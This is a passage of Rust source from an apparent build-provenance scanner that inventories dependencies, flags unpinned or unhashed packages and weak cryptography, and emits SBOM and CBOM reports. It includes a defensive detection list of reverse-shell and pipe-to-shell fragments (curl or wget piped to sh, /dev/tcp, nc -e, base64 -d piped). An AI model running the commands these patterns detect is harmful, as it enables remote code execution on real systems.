    if let Some(scripts) = value.get("scripts").and_then(Value::as_object) {
        for (name, command) in scripts {
            if is_npm_lifecycle_script(name) {
                add_sbom_policy_finding(
                    scanner,
                    FindingSeverity::High,
                    ("sbom-lifecycle-script", "fulcr-SBOM-LIFECYCLE-SCRIPT"),
                    name,
                    format!("npm lifecycle script {name} requires explicit approval"),
                    format!("{evidence}#scripts.{name}"),
                    "package_lifecycle_script_requires_approval",
                );
            }
            if command
                .as_str()
                .is_some_and(contains_secret_or_publish_indicator)
            {
                add_sbom_policy_finding(
                    scanner,
                    FindingSeverity::High,
                    (
                        "sbom-suspicious-package-script",
                        "fulcr-SBOM-SUSPICIOUS-PACKAGE-SCRIPT",
                    ),
                    name,
                    format!(
                        "npm script {name} references credential, token, registry, or publish behavior"
                    ),
                    format!("{evidence}#scripts.{name}"),
                    "package_script_requires_triage",
                );
            }
        }
    }
}

fn parse_pnpm_lock(text: &str, evidence: &str, scanner: &mut ScannerState) {
    let Ok(value) = serde_yaml_ng::from_str::<serde_yaml_ng::Value>(text) else {
        scanner.findings.push(ScanFinding {
            severity: FindingSeverity::High,
            category: "parse-error".to_string(),
            message: "failed to parse pnpm-lock.yaml with serde_yaml_ng".to_string(),
            evidence: evidence.to_string(),
        });
        return;
    };

    if let Some(importers) = yaml_child_mapping(&value, "importers") {
        for (_importer_name, importer) in importers {
            for field in ["dependencies", "devDependencies", "optionalDependencies"] {
                let Some(dependencies) = yaml_child_mapping(importer, field) else {
                    continue;
                };
                for (name, dependency) in dependencies {
                    let Some(name) = name.as_str() else { continue };
                    let spec = dependency
                        .as_str()
                        .or_else(|| yaml_child_str(dependency, "specifier"))
                        .or_else(|| yaml_child_str(dependency, "version"));
                    if let Some(spec) = spec {
                        enforce_dependency_spec_policy("npm", field, name, spec, evidence, scanner);
                        add_component(
                            name.to_string(),
                            Some(spec.to_string()),
                            "npm-declared",
                            evidence,
                            None,
                            scanner,
                        );
                    }
                }
            }
        }
    }

    if let Some(packages) = yaml_child_mapping(&value, "packages") {
        for (package_key, package) in packages {
            let Some(package_key) = package_key.as_str() else {
                continue;
            };
            let Some((name, version)) = parse_pnpm_package_key(package_key) else {
                continue;
            };
            let integrity = yaml_child_mapping(package, "resolution")
                .and_then(|resolution| yaml_mapping_str(resolution, "integrity"));
            let package_evidence = format!("{evidence}#{package_key}");
            if integrity.is_none() {
                add_sbom_policy_finding(
                    scanner,
                    FindingSeverity::High,
                    ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
                    &name,
                    format!("pnpm package {name} is missing a lockfile integrity hash"),
                    package_evidence.clone(),
                    "lockfile_integrity_required",
                );
            }
            add_component(name, version, "npm", &package_evidence, None, scanner);
        }
    }
}

fn parse_requirements(text: &str, evidence: &str, scanner: &mut ScannerState) {
    let mut logical_requirement = String::new();
    for raw_line in text.lines().chain(std::iter::once("")) {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            if !logical_requirement.is_empty() {
                parse_python_requirement(&logical_requirement, evidence, scanner);
                logical_requirement.clear();
            }
            continue;
        }
        if line.starts_with("--hash=") && !logical_requirement.is_empty() {
            logical_requirement.push(' ');
            logical_requirement.push_str(line.trim_end_matches('\\').trim());
        } else if line.starts_with('-') {
            continue;
        } else {
            if !logical_requirement.is_empty() {
                parse_python_requirement(&logical_requirement, evidence, scanner);
                logical_requirement.clear();
            }
            logical_requirement.push_str(line.trim_end_matches('\\').trim());
        }
        if !line.ends_with('\\') {
            parse_python_requirement(&logical_requirement, evidence, scanner);
            logical_requirement.clear();
        }
    }
}

fn parse_python_requirement(line: &str, evidence: &str, scanner: &mut ScannerState) {
    let requirement = line.split_whitespace().next().unwrap_or_default();
    let (name, version) = split_requirement(requirement);
    if !name.is_empty() {
        enforce_python_requirement_policy(name, version.as_deref(), line, evidence, scanner);
        add_component(name.to_string(), version, "pypi", evidence, None, scanner);
    }
}

fn parse_go_mod(text: &str, evidence: &str, scanner: &mut ScannerState) {
    let mut in_require_block = false;
    for line in text.lines() {
        let line = line.split("//").next().unwrap_or_default().trim();
        if line.starts_with("require (") {
            in_require_block = true;
            continue;
        }
        if in_require_block && line == ")" {
            in_require_block = false;
            continue;
        }

        let line = line.strip_prefix("require ").unwrap_or(line);
        if !in_require_block && !line.starts_with("github.com/") && !line.contains("/") {
            continue;
        }
        let mut parts = line.split_whitespace();
        let Some(name) = parts.next() else { continue };
        let version = parts.next().map(str::to_string);
        if name.contains('/') {
            if version.as_deref().is_some_and(is_exact_go_version) {
                scanner
                    .go_requirements
                    .insert((name.to_string(), version.clone().unwrap_or_default()));
            } else {
                add_sbom_policy_finding(
                    scanner,
                    FindingSeverity::High,
                    ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                    name,
                    format!("Go module {name} does not use an exact module version"),
                    evidence.to_string(),
                    "dependency_must_be_pinned",
                );
            }
            add_component(name.to_string(), version, "go", evidence, None, scanner);
        }
    }

    for line in text.lines().map(str::trim) {
        if line.starts_with("replace ") || line.starts_with("exclude ") {
            add_sbom_policy_finding(
                scanner,
                FindingSeverity::High,
                ("sbom-untrusted-source", "fulcr-SBOM-UNTRUSTED-SOURCE"),
                "go.mod",
                "Go replace or exclude directive requires explicit provenance review".to_string(),
                format!("{evidence}: {line}"),
                "dependency_source_requires_triage",
            );
        }
    }
}

fn parse_go_sum(text: &str, evidence: &str, scanner: &mut ScannerState) {
    for line in text.lines() {
        let mut fields = line.split_whitespace();
        let (Some(name), Some(version), Some(checksum)) =
            (fields.next(), fields.next(), fields.next())
        else {
            continue;
        };
        if !checksum.starts_with("h1:") {
            add_sbom_policy_finding(
                scanner,
                FindingSeverity::High,
                ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
                name,
                format!("Go checksum for {name}@{version} is not an h1 checksum"),
                evidence.to_string(),
                "lockfile_integrity_required",
            );
        } else if !version.ends_with("/go.mod") {
            scanner
                .go_checksums
                .insert((name.to_string(), version.to_string()));
        }
    }
}

fn parse_nuget_lock(text: &str, evidence: &str, scanner: &mut ScannerState) {
    let Ok(value) = serde_json::from_str::<Value>(text) else {
        scanner.findings.push(ScanFinding {
            severity: FindingSeverity::High,
            category: "parse-error".to_string(),
            message: "failed to parse packages.lock.json".to_string(),
            evidence: evidence.to_string(),
        });
        return;
    };
    let Some(targets) = value.get("dependencies").and_then(Value::as_object) else {
        add_sbom_policy_finding(
            scanner,
            FindingSeverity::High,
            ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
            "packages.lock.json",
            "NuGet lockfile has no dependency targets".to_string(),
            evidence.to_string(),
            "lockfile_integrity_required",
        );
        return;
    };

    for packages in targets.values().filter_map(Value::as_object) {
        for (name, package) in packages {
            let version = package
                .get("resolved")
                .and_then(Value::as_str)
                .map(str::to_string);
            if !version.as_deref().is_some_and(is_exact_literal_version) {
                add_sbom_policy_finding(
                    scanner,
                    FindingSeverity::High,
                    ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                    name,
                    format!("NuGet package {name} lacks an exact resolved version"),
                    evidence.to_string(),
                    "dependency_must_be_pinned",
                );
            }
            if package
                .get("contentHash")
                .and_then(Value::as_str)
                .is_none_or(str::is_empty)
            {
                add_sbom_policy_finding(
                    scanner,
                    FindingSeverity::High,
                    ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
                    name,
                    format!("NuGet package {name} lacks a contentHash"),
                    evidence.to_string(),
                    "lockfile_integrity_required",
                );
            }
            add_component(name.clone(), version, "nuget", evidence, None, scanner);
        }
    }
}

fn parse_pom_xml(text: &str, evidence: &str, digest: Option<String>, scanner: &mut ScannerState) {
    let Ok(document) = roxmltree::Document::parse(text) else {
        scanner.findings.push(ScanFinding {
            severity: FindingSeverity::High,
            category: "parse-error".to_string(),
            message: "failed to parse pom.xml with roxmltree".to_string(),
            evidence: evidence.to_string(),
        });
        add_manifest_component("maven-project", None, "maven", evidence, digest, scanner);
        return;
    };

    let project = document.root_element();
    let project_group = xml_child_text(project, "groupId").or_else(|| {
        project
            .children()
            .find(|node| node.has_tag_name("parent"))
            .and_then(|parent| xml_child_text(parent, "groupId"))
    });
    let project_artifact = xml_child_text(project, "artifactId");
    let project_version = xml_child_text(project, "version").or_else(|| {
        project
            .children()
            .find(|node| node.has_tag_name("parent"))
            .and_then(|parent| xml_child_text(parent, "version"))
    });
    if let Some(artifact) = project_artifact {
        let name = project_group
            .as_deref()
            .map(|group| format!("{group}:{artifact}"))
            .unwrap_or(artifact);
        add_component(name, project_version, "maven", evidence, digest, scanner);
    }

    for dependency in document
        .descendants()
        .filter(|node| node.has_tag_name("dependency"))
    {
        let Some(artifact) = xml_child_text(dependency, "artifactId") else {
            continue;
        };
        let name = xml_child_text(dependency, "groupId")
            .map(|group| format!("{group}:{artifact}"))
            .unwrap_or(artifact);
        let version = xml_child_text(dependency, "version");
        if !version.as_deref().is_some_and(is_exact_maven_version) {
            add_sbom_policy_finding(
                scanner,
                FindingSeverity::High,
                ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                &name,
                format!("Maven dependency {name} lacks an exact immutable version"),
                evidence.to_string(),
                "dependency_must_be_pinned",
            );
        }
        add_component(name, version, "maven", evidence, None, scanner);
    }
}

fn parse_dpkg_status(text: &str, evidence: &str, scanner: &mut ScannerState) {
    for block in text.split("\n\n") {
        let mut name = None;
        let mut version = None;
        for line in block.lines() {
            if let Some(value) = line.strip_prefix("Package:") {
                name = Some(value.trim().to_string());
            }
            if let Some(value) = line.strip_prefix("Version:") {
                version = Some(value.trim().to_string());
            }
        }
        if let Some(name) = name {
            add_component(name, version, "deb", evidence, None, scanner);
        }
    }
}

fn parse_apk_installed(text: &str, evidence: &str, scanner: &mut ScannerState) {
    for block in text.split("\n\n") {
        let mut name = None;
        let mut version = None;
        for line in block.lines() {
            if let Some(value) = line.strip_prefix("P:") {
                name = Some(value.trim().to_string());
            }
            if let Some(value) = line.strip_prefix("V:") {
                version = Some(value.trim().to_string());
            }
        }
        if let Some(name) = name {
            add_component(name, version, "apk", evidence, None, scanner);
        }
    }
}

fn scan_crypto_material(path: &Path, evidence: &str, text: &str, scanner: &mut ScannerState) {
    let lower = text.to_ascii_lowercase();
    let extension = path
        .extension()
        .and_then(|ext| ext.to_str())
        .unwrap_or_default();
    let file_name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default();
    let documentation = is_documentation_file(evidence, file_name);

    if !documentation && contains_private_key_material(&lower) {
        scanner.add_crypto(ScannedCryptoMaterial {
            name: path
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .to_string(),
            kind: "private-key-material".to_string(),
            algorithm: None,
            purpose: Some("private-or-secret-key-material".to_string()),
            evidence: evidence.to_string(),
        });
        scanner.findings.push(ScanFinding {
            severity: FindingSeverity::High,
            category: "private-key-material".to_string(),
            message: "private key material was found in file contents".to_string(),
            evidence: evidence.to_string(),
        });
    }

    parse_pem_blocks(path, evidence, text, scanner);

    match extension {
        "pem" | "crt" | "cer" => scanner.add_crypto(ScannedCryptoMaterial {
            name: path
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .to_string(),
            kind: "certificate-or-pem".to_string(),
            algorithm: None,
            purpose: Some("tls-or-signing-material".to_string()),
            evidence: evidence.to_string(),
        }),
        "key" | "p12" | "pfx" | "jks" => {
            scanner.add_crypto(ScannedCryptoMaterial {
                name: path
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .to_string(),
                kind: "key-material".to_string(),
                algorithm: None,
                purpose: Some("private-or-secret-key-material".to_string()),
                evidence: evidence.to_string(),
            });
            scanner.findings.push(ScanFinding {
                severity: FindingSeverity::High,
                category: "private-key-material".to_string(),
                message: "possible private key material was found".to_string(),
                evidence: evidence.to_string(),
            });
        }
        _ => {}
    }

    for (needle, algorithm, severity) in [
        ("tlsv1.0", "TLS 1.0", FindingSeverity::High),
        ("tlsv1.1", "TLS 1.1", FindingSeverity::Medium),
        ("ssl3", "SSL 3.0", FindingSeverity::High),
        ("rc4", "RC4", FindingSeverity::High),
        ("3des", "3DES", FindingSeverity::Medium),
        ("des-ede3", "3DES", FindingSeverity::Medium),
        ("md5", "MD5", FindingSeverity::Medium),
        ("sha1", "SHA-1", FindingSeverity::Low),
    ] {
        if lower.contains(needle) {
            scanner.add_crypto(ScannedCryptoMaterial {
                name: algorithm.to_string(),
                kind: "algorithm-or-protocol".to_string(),
                algorithm: Some(algorithm.to_string()),
                purpose: Some("observed-in-source-or-config".to_string()),
                evidence: evidence.to_string(),
            });
            scanner.findings.push(ScanFinding {
                severity: unstructured_text_severity(severity, documentation),
                category: "crypto-policy-drift".to_string(),
                message: format!("legacy or sensitive crypto primitive observed: {algorithm}"),
                evidence: evidence.to_string(),
            });
        }
    }

    for (needle, library) in [
        ("openssl", "OpenSSL"),
        ("rustls", "rustls"),
        ("ring::", "ring"),
    ] {
        if lower.contains(needle) {
            scanner.add_crypto(ScannedCryptoMaterial {
                name: library.to_string(),
                kind: "crypto-library".to_string(),
                algorithm: None,
                purpose: Some("observed-in-source-or-config".to_string()),
                evidence: evidence.to_string(),
            });
        }
    }

    for (needle, material, severity) in [
        ("openssl 1.0", "OpenSSL 1.0.x", FindingSeverity::High),
        ("openssl/1.0", "OpenSSL 1.0.x", FindingSeverity::High),
        ("openssl-1.0", "OpenSSL 1.0.x", FindingSeverity::High),
        ("openssl 1.1.1", "OpenSSL 1.1.1", FindingSeverity::High),
        ("openssl/1.1.1", "OpenSSL 1.1.1", FindingSeverity::High),
        ("openssl-1.1.1", "OpenSSL 1.1.1", FindingSeverity::High),
        ("rsa-1024", "RSA-1024", FindingSeverity::High),
        ("rsa 1024", "RSA-1024", FindingSeverity::High),
        ("1024-bit rsa", "RSA-1024", FindingSeverity::High),
        ("keysize=1024", "RSA-1024", FindingSeverity::High),
        ("key_size = 1024", "RSA-1024", FindingSeverity::High),
        ("secp192r1", "secp192r1", FindingSeverity::High),
        ("prime192v1", "prime192v1", FindingSeverity::High),
        ("secp224r1", "secp224r1", FindingSeverity::Medium),
        ("sha1withrsa", "SHA-1 with RSA", FindingSeverity::High),
        ("md5withrsa", "MD5 with RSA", FindingSeverity::High),
    ] {
        if lower.contains(needle) {
            scanner.add_crypto(ScannedCryptoMaterial {
                name: material.to_string(),
                kind: "disallowed-crypto-policy-material".to_string(),
                algorithm: Some(material.to_string()),
                purpose: Some("observed-in-source-config-or-binary".to_string()),
                evidence: evidence.to_string(),
            });
            scanner.findings.push(ScanFinding {
                severity: unstructured_text_severity(severity, documentation),
                category: "crypto-policy-drift".to_string(),
                message: format!("disallowed or expired crypto material observed: {material}"),
                evidence: evidence.to_string(),
            });
        }
    }
}

fn unstructured_text_severity(severity: FindingSeverity, documentation: bool) -> FindingSeverity {
    if documentation {
        FindingSeverity::Low
    } else if matches!(severity, FindingSeverity::High | FindingSeverity::Critical) {
        FindingSeverity::Medium
    } else {
        severity
    }
}

fn scan_suspicious_text(
    recipe: &Recipe,
    evidence: &str,
    text: &str,
    executable: bool,
    scanner: &mut ScannerState,
) {
    let suspicious = [
        ("curl", "| sh"),
        ("curl", "| bash"),
        ("wget", "| sh"),
        ("wget", "| bash"),
        ("/dev/tcp", ""),
        ("bash -i", ""),
        ("netcat", " -e"),
        ("nc ", " -e"),
        ("base64 -d", "|"),
    ];

    let suspicious_line = text.lines().find(|line| {
        let lower = line.to_ascii_lowercase();
        suspicious.iter().any(|(left, right)| {
            lower.contains(left) && (right.is_empty() || lower.contains(right))
        })
    });

    if let Some(line) = suspicious_line {
        let command_referenced = recipe
            .build
            .command
            .iter()
            .any(|argument| argument.contains(evidence));
        let severity = if executable || command_referenced {
            FindingSeverity::High
        } else {
            FindingSeverity::Medium
        };
        scanner.findings.push(ScanFinding {
            severity: severity.clone(),
            category: "suspicious-build-behavior".to_string(),
            message: "script contains remote execution, reverse shell, or encoded command pattern"
                .to_string(),
            evidence: format!("{evidence}: {}", line.trim()),
        });
        if matches!(severity, FindingSeverity::High | FindingSeverity::Critical) {
            scanner.add_vex_candidate(VulnerabilityAssessment {
                vulnerability: "fulcr-SUSPICIOUS-BUILD-BEHAVIOR".to_string(),
                status: VexStatus::UnderInvestigation,
                component: evidence.to_string(),
                justification: "unexpected_network_or_command_execution_requires_triage"
                    .to_string(),
                detail:
                    "Potential command-and-control or remote-code execution pattern was observed."
                        .to_string(),
                evidence: evidence.to_string(),
            });
        }
    }
}

fn scan_recipe_alignment(recipe: &Recipe, evidence: &str, text: &str, scanner: &mut ScannerState) {
    if evidence.ends_with("Dockerfile") || evidence.ends_with("Containerfile") {
        let lower = text.to_ascii_lowercase();
        if lower.contains("from ") && recipe.builder.digest.is_none() {
            scanner.findings.push(ScanFinding {
                severity: FindingSeverity::Medium,
                category: "metadata-misalignment".to_string(),
                message: "container build file exists but recipe builder is not pinned by digest"
                    .to_string(),
                evidence: evidence.to_string(),
            });
        }
    }
}

fn compare_recipe_metadata(
    recipe: &Recipe,
    scanner: &mut ScannerState,
    verify_declared_materials: bool,
) {
    let missing_go_checksums = scanner
        .go_requirements
        .difference(&scanner.go_checksums)
        .cloned()
        .collect::<Vec<_>>();
    for (name, version) in missing_go_checksums {
        add_sbom_policy_finding(
            scanner,
            FindingSeverity::High,
            ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
            &name,
            format!("Go module {name}@{version} has no matching go.sum checksum"),
            "go.sum".to_string(),
            "lockfile_integrity_required",
        );
    }

    if !verify_declared_materials {
        return;
    }

    for material in &recipe.materials {
        if material_is_file(material) {
            let actual = scanner
                .file_digests
                .iter()
                .find(|(path, _)| material_matches_path(material, path))
                .map(|(_, digest)| digest);
            match actual {
                Some(actual) if actual == &material.digest => {}
                Some(actual) => scanner.findings.push(ScanFinding {
                    severity: FindingSeverity::High,
                    category: "metadata-misalignment".to_string(),
                    message: format!(
                        "declared material digest does not match scanned bytes: {}",
                        material.name
                    ),
                    evidence: format!("expected {}, found {actual}", material.digest),
                }),
                None => scanner.findings.push(ScanFinding {
                    severity: FindingSeverity::High,
                    category: "metadata-misalignment".to_string(),
                    message: format!(
                        "declared file material was not observed by scanner: {}",
                        material.name
                    ),
                    evidence: material.name.clone(),
                }),
            }
            continue;
        }

        let material_seen = scanner.components.values().any(|component| {
            component.evidence.ends_with(&material.name) || component.name == material.name
        });
        if !material_seen {
            scanner.findings.push(ScanFinding {
                severity: FindingSeverity::Low,
                category: "metadata-misalignment".to_string(),
                message: format!(
                    "declared material was not observed by scanner: {}",
                    material.name
                ),
                evidence: material.name.clone(),
            });
        }
    }
}

fn material_is_file(material: &crate::models::Material) -> bool {
    material.kind.as_deref().is_some_and(|kind| {
        matches!(
            kind,
            "source-file" | "lockfile" | "manifest" | "config-file"
        )
    })
}

fn material_matches_path(material: &crate::models::Material, path: &str) -> bool {
    path == material.name || path.ends_with(&format!("/{}", material.name))
}

fn declared_artifact_evidence(recipe: &Recipe, root: &Path) -> Option<String> {
    let artifact = recipe.build.artifact.as_deref()?;
    let working_dir = recipe
        .build
        .working_dir
        .as_deref()
        .unwrap_or_else(|| Path::new(""));
    let path = if working_dir.is_absolute() {
        working_dir.join(artifact)
    } else {
        root.join(working_dir).join(artifact)
    };
    let relative = path.strip_prefix(root).ok()?;
    if relative.components().any(|component| {
        matches!(
            component,
            std::path::Component::ParentDir
                | std::path::Component::RootDir
                | std::path::Component::Prefix(_)
        )
    }) {
        return None;
    }
    Some(relative.display().to_string().replace('\\', "/"))
}

fn digest_file_blocking(path: &Path) -> anyhow::Result<String> {
    let mut file = fs::File::open(path)?;
    let mut digest = Sha256::new();
    let mut buffer = [0_u8; 8192];
    loop {
        let read = file.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        digest.update(&buffer[..read]);
    }
    Ok(format!("sha256:{}", hex::encode(digest.finalize())))
}

fn digest_file_inventory(
    file_digests: &BTreeMap<String, String>,
    file_metadata: &BTreeMap<String, String>,
) -> String {
    let mut digest = Sha256::new();
    for (path, file_digest) in file_digests {
        let metadata = file_metadata.get(path).map(String::as_str).unwrap_or("");
        digest.update((path.len() as u64).to_be_bytes());
        digest.update(path.as_bytes());
        digest.update((file_digest.len() as u64).to_be_bytes());
        digest.update(file_digest.as_bytes());
        digest.update((metadata.len() as u64).to_be_bytes());
        digest.update(metadata.as_bytes());
    }
    format!("sha256:{}", hex::encode(digest.finalize()))
}

#[cfg(unix)]
fn file_metadata_fingerprint(metadata: &fs::Metadata, kind: &str) -> String {
    use std::os::unix::fs::PermissionsExt;
    format!("{kind}:mode={:o}", metadata.permissions().mode() & 0o7777)
}

#[cfg(not(unix))]
fn file_metadata_fingerprint(metadata: &fs::Metadata, kind: &str) -> String {
    format!("{kind}:readonly={}", metadata.permissions().readonly())
}

fn build_sbom(
    recipe: &Recipe,
    components: &[ScannedComponent],
    findings: &[ScanFinding],
    created_at: &str,
) -> Value {
    let components = components
        .iter()
        .map(|component| {
            json!({
                "type": "library",
                "name": component.name,
                "version": component.version,
                "purl": component.purl,
                "hashes": component.digest.as_ref().map(|digest| json!([{ "alg": "SHA-256", "content": digest.strip_prefix("sha256:").unwrap_or(digest) }])),
                "evidence": {
                    "identity": {
                        "field": "source-file",
                        "confidence": 0.75,
                        "methods": [{ "technique": "source-metadata", "value": component.evidence }]
                    }
                },
                "properties": [{ "name": "fulcr:component-kind", "value": component.kind }]
            })
        })
        .collect::<Vec<_>>();
    let policy_findings = findings
        .iter()
        .filter(|finding| finding.category.starts_with("sbom-"))
        .map(|finding| {
            json!({
                "category": finding.category,
                "severity": finding.severity,
                "message": finding.message,
                "evidence": finding.evidence
            })
        })
        .collect::<Vec<_>>();

    json!({
        "bomFormat": "CycloneDX",
        "specVersion": "1.6",
        "serialNumber": format!("urn:uuid:{}", Uuid::new_v4()),
        "version": 1,
        "metadata": {
            "timestamp": created_at,
            "tools": { "components": [{ "type": "application", "name": "fulcr-native-scanner", "version": "0.1" }] },
            "component": {
                "type": "application",
                "name": recipe.name,
                "version": recipe.source.revision,
                "properties": [
                    { "name": "fulcr:recipe-digest", "value": recipe.digest },
                    { "name": "fulcr:source", "value": recipe.source.repo }
                ]
            }
        },
        "components": components,
        "properties": [
            { "name": "fulcr:sbom-policy:exact-pinning", "value": "required" },
            { "name": "fulcr:sbom-policy:lockfile-integrity", "value": "required" },
            { "name": "fulcr:sbom-policy:lifecycle-scripts", "value": "deny-by-default" },
            { "name": "fulcr:sbom-policy:dependency-source", "value": "trusted-or-explicitly-reviewed" }
        ],
        "fulcrPolicyFindings": policy_findings
    })
}

fn build_cbom(
    recipe: &Recipe,
    crypto: &[ScannedCryptoMaterial],
    findings: &[ScanFinding],
    created_at: &str,
) -> Value {
    let crypto_assets = crypto
        .iter()
        .map(|item| {
            json!({
                "name": item.name,
                "kind": item.kind,
                "algorithm": item.algorithm,
                "purpose": item.purpose,
                "evidence": item.evidence
            })
        })
        .collect::<Vec<_>>();
    let crypto_findings = findings
        .iter()
        .filter(|finding| finding.category.contains("crypto") || finding.category.contains("key"))
        .collect::<Vec<_>>();

    json!({
        "bomFormat": "CycloneDX-CBOM",
        "specVersion": "prototype",
        "serialNumber": format!("urn:uuid:{}", Uuid::new_v4()),
        "metadata": {
            "timestamp": created_at,
            "component": {
                "name": recipe.name,
                "source": recipe.source.repo,
                "revision": recipe.source.revision,
                "recipeDigest": recipe.digest
            },
            "properties": [
                { "name": "fulcr:cbom-policy:legacy-protocols", "value": "deny" },
                { "name": "fulcr:cbom-policy:weak-algorithms", "value": "deny" },
                { "name": "fulcr:cbom-policy:private-key-material", "value": "deny" },
                { "name": "fulcr:cbom-policy:eol-crypto-libraries", "value": "deny" }
            ]
        },
        "cryptoAssets": crypto_assets,
        "findings": crypto_findings
    })
}

fn flush_cargo_package(
    name: &mut Option<String>,
    version: &mut Option<String>,
    checksum: &mut Option<String>,
    evidence: &str,
    scanner: &mut ScannerState,
) {
    if let Some(name) = name.take() {
        let version = version.take();
        let checksum_seen = checksum.take().is_some();
        if version.is_some() && !checksum_seen {
            add_sbom_policy_finding(
                scanner,
                FindingSeverity::High,
                ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
                &name,
                format!("Cargo package {name} has no checksum in Cargo.lock"),
                evidence.to_string(),
                "lockfile_integrity_requires_triage",
            );
        }
        add_component(name, version, "cargo", evidence, None, scanner);
    }
}

fn enforce_npm_lock_policy(
    name: &str,
    package: &Value,
    evidence: &str,
    scanner: &mut ScannerState,
) {
    if package.get("integrity").and_then(Value::as_str).is_none() {
        add_sbom_policy_finding(
            scanner,
            FindingSeverity::High,
            ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
            name,
            format!("npm package {name} is missing a lockfile integrity hash"),
            evidence.to_string(),
            "lockfile_integrity_required",
        );
    }

    if package
        .get("hasInstallScript")
        .and_then(Value::as_bool)
        .unwrap_or(false)
    {
        add_sbom_policy_finding(
            scanner,
            FindingSeverity::High,
            ("sbom-lifecycle-script", "fulcr-SBOM-LIFECYCLE-SCRIPT"),
            name,
            format!("npm package {name} declares an install lifecycle script in the lockfile"),
            evidence.to_string(),
            "package_lifecycle_script_requires_approval",
        );
    }

    if let Some(resolved) = package.get("resolved").and_then(Value::as_str) {
        enforce_dependency_source_policy("npm", name, resolved, evidence, scanner);
    }
}

fn enforce_dependency_spec_policy(
    ecosystem: &str,
    field: &str,
    name: &str,
    spec: &str,
    evidence: &str,
    scanner: &mut ScannerState,
) {
    if !is_exact_version_spec(ecosystem, spec) {
        add_sbom_policy_finding(
            scanner,
            FindingSeverity::High,
            ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
            name,
            format!("{ecosystem} dependency {name} in {field} is not pinned exactly: {spec}"),
            evidence.to_string(),
            "dependency_must_be_pinned",
        );
    }
    enforce_dependency_source_policy(ecosystem, name, spec, evidence, scanner);
}

fn enforce_python_requirement_policy(
    name: &str,
    version: Option<&str>,
    line: &str,
    evidence: &str,
    scanner: &mut ScannerState,
) {
    if version.is_none() || !line.contains("==") {
        add_sbom_policy_finding(
            scanner,
            FindingSeverity::High,
            ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
            name,
            format!("Python requirement {name} is not pinned with =="),
            evidence.to_string(),
            "dependency_must_be_pinned",
        );
    }
    if !line.contains("--hash=sha256:") {
        add_sbom_policy_finding(
            scanner,
            FindingSeverity::High,
            ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
            name,
            format!("Python requirement {name} lacks a sha256 hash pin"),
            evidence.to_string(),
            "lockfile_integrity_requires_triage",
        );
    }
    enforce_dependency_source_policy("pypi", name, line, evidence, scanner);
}

fn enforce_dependency_source_policy(
    ecosystem: &str,
    name: &str,
    spec: &str,
    evidence: &str,
    scanner: &mut ScannerState,
) {
    let lower = spec.trim().to_ascii_lowercase();
    let source_risk = if lower.starts_with("http://") {
        Some((
            FindingSeverity::High,
            "insecure direct HTTP dependency source",
        ))
    } else if lower.starts_with("https://")
        || lower.starts_with("git+")
        || lower.starts_with("github:")
        || lower.starts_with("gitlab:")
        || lower.starts_with("bitbucket:")
        || lower.starts_with("npm:")
    {
        Some((
            FindingSeverity::High,
            "direct or aliased dependency source requires review",
        ))
    } else if lower.starts_with("file:")
        || lower.starts_with("link:")
        || lower.starts_with("workspace:")
    {
        Some((
            FindingSeverity::High,
            "local or workspace dependency source requires provenance",
        ))
    } else {
        None
    };

    if let Some((severity, message)) = source_risk {
        add_sbom_policy_finding(
            scanner,
            severity,
            ("sbom-untrusted-source", "fulcr-SBOM-UNTRUSTED-SOURCE"),
            name,
            format!("{ecosystem} dependency {name} uses {message}: {spec}"),
            evidence.to_string(),
            "dependency_source_requires_triage",
        );
    }
}

fn add_sbom_policy_finding(
    scanner: &mut ScannerState,
    severity: FindingSeverity,
    policy: (&str, &str),
    component: &str,
    message: String,
    evidence: String,
    justification: &str,
) {
    let (category, vulnerability) = policy;
    let requires_triage = matches!(severity, FindingSeverity::High | FindingSeverity::Critical);
    scanner.findings.push(ScanFinding {
        severity,
        category: category.to_string(),
        message: message.clone(),
        evidence: evidence.clone(),
    });
    if requires_triage {
        scanner.add_vex_candidate(VulnerabilityAssessment {
            vulnerability: vulnerability.to_string(),
            status: VexStatus::UnderInvestigation,
            component: component.to_string(),
            justification: justification.to_string(),
            detail: message,
            evidence,
        });
    }
}

fn add_manifest_component(
    name: &str,
    version: Option<String>,
    kind: &str,
    evidence: &str,
    digest: Option<String>,
    scanner: &mut ScannerState,
) {
    add_component(name.to_string(), version, kind, evidence, digest, scanner);
}

fn add_component(
    name: String,
    version: Option<String>,
    kind: &str,
    evidence: &str,
    digest: Option<String>,
    scanner: &mut ScannerState,
) {
    if name.trim().is_empty() {
        return;
    }
    let purl = package_url(kind, &name, version.as_deref());
    let component = ScannedComponent {
        name: name.trim().to_string(),
        version,
        kind: kind.to_string(),
        purl,
        digest,
        evidence: evidence.to_string(),
    };
    scanner.add_component(component);
}

fn package_url(kind: &str, name: &str, version: Option<&str>) -> Option<String> {
    if kind == "cargo-declared" {
        return Some(match version.and_then(exact_cargo_version_value) {
            Some(version) => format!("pkg:cargo/{name}@{version}"),
            None => format!("pkg:cargo/{name}"),
        });
    }

    if kind == "maven" {
        return Some(match (name.split_once(':'), version) {
            (Some((group, artifact)), Some(version)) => {
                format!("pkg:maven/{group}/{artifact}@{version}")
            }
            (Some((group, artifact)), None) => format!("pkg:maven/{group}/{artifact}"),
            (None, Some(version)) => format!("pkg:maven/{name}@{version}"),
            (None, None) => format!("pkg:maven/{name}"),
        });
    }

    let ecosystem = match kind {
